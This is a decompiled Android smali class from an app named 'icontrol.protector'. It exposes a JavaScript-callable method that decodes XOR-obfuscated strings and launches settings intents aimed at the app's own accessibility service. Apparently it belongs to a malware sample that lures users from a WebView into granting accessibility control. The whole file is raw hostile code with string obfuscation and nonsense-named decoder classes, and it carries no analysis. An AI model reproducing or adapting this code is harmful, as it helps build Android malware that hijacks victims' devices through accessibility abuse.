.class public Lcom/icontrol/protector/AccessibilityActivity$d;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/AccessibilityActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "d"
.end annotation


# instance fields
.field a:Landroid/content/Context;

.field final synthetic b:Lcom/icontrol/protector/AccessibilityActivity;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessibilityActivity;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->a:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public OK()V
    .locals 7
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x50800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v3, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-class v4, Lcom/icontrol/protector/AccessServices;

    if-nez v3, :cond_0

    :try_start_1
    new-instance v0, Landroid/content/Intent;

    const/16 v3, 0x27

    new-array v5, v3, [B

    fill-array-data v5, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v0, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v5

    if-nez v5, :cond_0

    new-instance v0, Landroid/content/Intent;

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v3, 0x23

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessibilityActivity;->e:Landroid/content/Context;

    invoke-direct {v3, v5, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x1

    new-array v3, v3, [B

    const/4 v5, 0x0

    aput-byte v2, v3, v5

    new-array v5, v2, [B

    fill-array-data v5, :array_8

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    const/16 v4, 0x1b

    new-array v5, v4, [B

    fill-array-data v5, :array_9

    new-array v6, v2, [B

    fill-array-data v6, :array_a

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v1}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    new-array v4, v4, [B

    fill-array-data v4, :array_b

    new-array v5, v2, [B

    fill-array-data v5, :array_c

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_d

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/AccessibilityActivity$d;->b:Lcom/icontrol/protector/AccessibilityActivity;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    return-void

    :array_0
    .array-data 1
        0x78t
        0x3ft
        0x78t
        0x24t
        -0x46t
        -0x14t
        -0x1t
        0x64t
        0x6et
        0x3et
        0x72t
        0x24t
        -0x58t
        -0x12t
        -0xft
        0x72t
        0x68t
        0x23t
        0x7ct
        0x68t
        -0x60t
        -0x1ft
        -0x5t
        0x63t
        0x62t
        0x7et
        0x7ct
        0x64t
        -0x46t
        -0x7t
        -0xdt
        0x7bt
        0x77t
        0x35t
        0x71t
        0x55t
        -0x46t
        -0x18t
        -0x20t
        0x61t
        0x72t
        0x33t
        0x70t
    .end array-data

    :array_1
    .array-data 1
        0x1bt
        0x50t
        0x15t
        0xat
        -0x37t
        -0x73t
        -0x6et
        0x17t
    .end array-data

    :array_2
    .array-data 1
        -0x3bt
        0x33t
        0x77t
        -0x1et
        -0x2ft
        -0x54t
        -0x12t
        0x49t
        -0x29t
        0x38t
        0x67t
        -0x1ct
        -0x29t
        -0x55t
        -0x13t
        0x14t
        -0x76t
        0x1ct
        0x50t
        -0x2dt
        -0x5t
        -0x6at
        -0x27t
        0x2et
        -0x1at
        0x14t
        0x5ft
        -0x27t
        -0x16t
        -0x64t
        -0x2bt
        0x34t
        -0x1ft
        0x9t
        0x47t
        -0x27t
        -0x10t
        -0x7et
        -0x27t
    .end array-data

    :array_3
    .array-data 1
        -0x5ct
        0x5dt
        0x13t
        -0x70t
        -0x42t
        -0x3bt
        -0x76t
        0x67t
    .end array-data

    :array_4
    .array-data 1
        -0x6dt
        -0x40t
        -0x5bt
        -0xdt
        -0x57t
        -0x6ct
        -0x12t
        0x79t
        -0x7ft
        -0x35t
        -0x4bt
        -0xbt
        -0x51t
        -0x6dt
        -0x13t
        0x24t
        -0x24t
        -0x11t
        -0x7et
        -0x3et
        -0x7dt
        -0x52t
        -0x27t
        0x1et
        -0x50t
        -0x19t
        -0x73t
        -0x38t
        -0x6et
        -0x5ct
        -0x2bt
        0x4t
        -0x49t
        -0x6t
        -0x6bt
        -0x38t
        -0x78t
        -0x46t
        -0x27t
    .end array-data

    :array_5
    .array-data 1
        -0xet
        -0x52t
        -0x3ft
        -0x7ft
        -0x3at
        -0x3t
        -0x76t
        0x57t
    .end array-data

    :array_6
    .array-data 1
        0x2ct
        0x6et
        -0x34t
        -0x5et
        -0x3t
        0x38t
        0x51t
        0x69t
        0x24t
        0x6et
        -0x24t
        -0x4bt
        -0x4t
        0x25t
        0x1bt
        0x22t
        0x35t
        0x74t
        -0x26t
        -0x4ft
        -0x44t
        0x12t
        0x7at
        0xat
        0x1dt
        0x4ft
        -0x1at
        -0x6bt
        -0x24t
        0x5t
        0x6at
        0x9t
        0xct
        0x4dt
        -0x13t
    .end array-data

    :array_7
    .array-data 1
        0x4dt
        0x0t
        -0x58t
        -0x30t
        -0x6et
        0x51t
        0x35t
        0x47t
    .end array-data

    :array_8
    .array-data 1
        0x27t
        -0x54t
        -0x80t
        -0x7t
        -0xdt
        -0x11t
        -0x56t
        0x2t
    .end array-data

    :array_9
    .array-data 1
        0x0t
        0x1ct
        -0x5ct
        -0x22t
        -0x69t
        0x29t
        -0x1ct
        -0x29t
        0x49t
        0x55t
        -0x59t
        -0x28t
        -0x7et
        0x27t
        -0x19t
        -0x2bt
        0x54t
        0x1bt
        -0x62t
        -0x35t
        -0x6ft
        0x27t
        -0x7t
        -0x11t
        0x51t
        0xat
        -0x48t
    .end array-data

    :array_a
    .array-data 1
        0x3at
        0x6ft
        -0x3ft
        -0x56t
        -0x1dt
        0x40t
        -0x76t
        -0x50t
    .end array-data

    :array_b
    .array-data 1
        0x56t
        0x24t
        -0xdt
        -0x1ct
        0x20t
        0xct
        -0x17t
        0x6t
        0x1ft
        0x6dt
        -0x10t
        -0x1et
        0x35t
        0x2t
        -0x16t
        0x4t
        0x2t
        0x23t
        -0x37t
        -0xft
        0x26t
        0x2t
        -0xct
        0x3et
        0x7t
        0x32t
        -0x11t
    .end array-data

    :array_c
    .array-data 1
        0x6ct
        0x57t
        -0x6at
        -0x70t
        0x54t
        0x65t
        -0x79t
        0x61t
    .end array-data

    :array_d
    .array-data 1
        0x27t
        0x6dt
        -0x7ft
        0x1bt
        -0x7ct
        0x65t
        0x47t
        -0x35t
        0x6et
        0x24t
        -0x69t
        0x7t
        -0x61t
        0x7bt
        0x76t
        -0x36t
        0x6ft
        0x7ft
        -0x7dt
        0x2t
        -0x6bt
        0x62t
        0x5dt
        -0xdt
        0x7ct
        0x6ct
        -0x7dt
        0x1ct
    .end array-data

    :array_e
    .array-data 1
        0x1dt
        0x1et
        -0x1ct
        0x6ft
        -0x10t
        0xct
        0x29t
        -0x54t
    .end array-data
.end method
